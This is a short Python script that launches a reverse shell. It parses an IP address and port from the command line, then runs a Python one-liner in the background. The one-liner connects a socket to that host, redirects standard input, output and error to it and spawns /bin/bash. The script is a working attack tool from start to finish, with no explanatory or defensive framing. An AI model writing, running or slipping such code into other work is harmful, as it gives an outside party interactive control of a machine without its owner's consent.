#!/bin/python

import os
import argparse

parser = argparse.ArgumentParser(description="")
parser.add_argument("--ip")
parser.add_argument("--port", type=int)
parser.add_argument("--id")

args = parser.parse_args()

command = f'import socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("{args.ip}", {args.port}));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);pty.spawn("/bin/bash")'
os.system(f"python3 -c '{command}' & disown ")
